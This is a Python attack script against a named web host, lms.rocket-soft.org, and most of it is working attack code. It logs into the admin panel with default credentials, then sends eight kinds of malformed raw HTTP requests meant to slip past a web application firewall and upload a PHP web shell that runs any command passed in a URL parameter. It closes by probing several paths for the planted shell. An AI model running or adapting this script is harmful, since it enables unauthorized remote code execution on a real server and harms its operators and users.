"""
LAST RESORT - RAW SOCKET MALFORMED HTTP
========================================

This is the most aggressive technique - sending malformed HTTP
that might confuse the WAF but be accepted by the backend
"""

import socket
import ssl
import time
import re
import requests

HOST = "lms.rocket-soft.org"
PORT = 443
BASE_URL = f"https://{HOST}"

def raw_request(request_data):
    """Send raw HTTP via SSL socket"""
    context = ssl.create_default_context()
    
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        with context.wrap_socket(sock, server_hostname=HOST) as ssock:
            ssock.send(request_data.encode())
            response = b""
            while True:
                try:
                    chunk = ssock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except:
                    break
            return response

def login_and_get_cookie():
    """Login and get session cookie"""
    session = requests.Session()
    r = session.get(f"{BASE_URL}/admin/login")
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
    session.post(f"{BASE_URL}/admin/login", data={
        "_token": csrf, 
        "email": "admin@demo.com", 
        "password": "admin"
    })
    return session.cookies.get('laravel_session', ''), csrf

print("""
╔══════════════════════════════════════════════════════════════╗
║       LAST RESORT - RAW SOCKET ATTACK                        ║
║       Target: lms.rocket-soft.org                            ║
╚══════════════════════════════════════════════════════════════╝
""")

cookie, csrf = login_and_get_cookie()
print(f"[+] Got session cookie")

# PHP shell
shell = "<?php system($_GET['c']); ?>"

# ============================================
# TECHNIQUE 1: Malformed HTTP Version
# ============================================
print("\n[*] Testing malformed HTTP version...")

versions = ["HTTP/0.9", "HTTP/1.0", "HTTP/1.2", "HTTP/2.0", "HTTP/9.9"]

for ver in versions:
    req = f"""POST /admin/update/basic-update {ver}\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Length: 100\r
Content-Type: application/x-www-form-urlencoded\r
\r
_token={csrf}&file={shell}"""

    try:
        resp = raw_request(req)
        if b"200" in resp[:50] or b"uid=" in resp:
            print(f"    [!] {ver}: Interesting response!")
            print(resp[:200])
    except Exception as e:
        pass

# ============================================
# TECHNIQUE 2: Header Injection via Line Folding
# ============================================
print("\n[*] Testing header line folding (obsolete HTTP/1.0 feature)...")

req = f"""POST /admin/update/basic-update HTTP/1.1\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Type: multipart/form-data;\r
 boundary=----WebKitFormBoundary123\r
X-Injected:\r
 X-Real-Header: bypass\r
Content-Length: 300\r
\r
------WebKitFormBoundary123\r
Content-Disposition: form-data; name="_token"\r
\r
{csrf}\r
------WebKitFormBoundary123\r
Content-Disposition: form-data; name="file"; filename="shell.php"\r
Content-Type: application/octet-stream\r
\r
{shell}\r
------WebKitFormBoundary123--"""

try:
    resp = raw_request(req)
    if b"200" in resp[:50]:
        print("    [!] Line folding accepted!")
except:
    pass

# ============================================
# TECHNIQUE 3: Tab in Header Name
# ============================================
print("\n[*] Testing tab characters in headers...")

req = f"""POST /admin/update/basic-update HTTP/1.1\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Type:\tmultipart/form-data; boundary=xxx\r
Content\t-Length: 100\r
\r
test"""

try:
    resp = raw_request(req)
    if b"200" in resp[:50]:
        print("    [!] Tab in header accepted!")
except:
    pass

# ============================================
# TECHNIQUE 4: Null Byte in Request
# ============================================
print("\n[*] Testing null byte injection...")

req = f"""POST /admin/update/basic-update\x00.html HTTP/1.1\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Length: 50\r
\r
_token={csrf}"""

try:
    resp = raw_request(req)
    if b"200" in resp[:50]:
        print("    [!] Null byte accepted!")
except:
    pass

# ============================================
# TECHNIQUE 5: Double Host Header
# ============================================
print("\n[*] Testing double Host header...")

req = f"""POST /admin/update/basic-update HTTP/1.1\r
Host: localhost\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Length: 50\r
\r
_token={csrf}"""

try:
    resp = raw_request(req)
    if b"200" in resp[:50] or b"302" in resp[:50]:
        print("    [!] Double Host accepted!")
        print(resp[:200])
except:
    pass

# ============================================
# TECHNIQUE 6: Absolute URI Request
# ============================================
print("\n[*] Testing absolute URI in request line...")

req = f"""POST https://{HOST}/admin/update/basic-update HTTP/1.1\r
Host: localhost\r
Cookie: laravel_session={cookie}\r
Content-Length: 50\r
\r
_token={csrf}"""

try:
    resp = raw_request(req)
    if b"200" in resp[:50]:
        print("    [!] Absolute URI accepted!")
except:
    pass

# ============================================
# TECHNIQUE 7: Invalid Content-Length
# ============================================
print("\n[*] Testing invalid Content-Length values...")

values = ["-1", "0xFFFF", "999999999999", "abc", "10e5"]

for val in values:
    req = f"""POST /admin/update/basic-update HTTP/1.1\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Length: {val}\r
\r
_token={csrf}"""

    try:
        resp = raw_request(req)
        if b"200" in resp[:50]:
            print(f"    [!] Content-Length {val} accepted!")
    except:
        pass

# ============================================
# TECHNIQUE 8: Request with Extra Spaces
# ============================================
print("\n[*] Testing extra spaces in request...")

req = f"""POST  /admin/update/basic-update  HTTP/1.1\r
Host: {HOST}\r
Cookie: laravel_session={cookie}\r
Content-Length: 50\r
\r
_token={csrf}"""

try:
    resp = raw_request(req)
    if b"200" in resp[:50]:
        print("    [!] Extra spaces accepted!")
except:
    pass

# ============================================
# FINAL CHECK
# ============================================
print("\n[*] Final shell check...")

session = requests.Session()
session.cookies.set('laravel_session', cookie)

shells = ["/shell.php?c=id", "/s.php?c=id", "/public/shell.php?c=id"]
for s in shells:
    try:
        r = session.get(f"{BASE_URL}{s}")
        if "uid=" in r.text:
            print(f"\n[!!!] SHELL FOUND: {BASE_URL}{s}")
    except:
        pass

print("\n" + "="*60)
print("    RAW SOCKET ATTACK COMPLETE")
print("="*60)
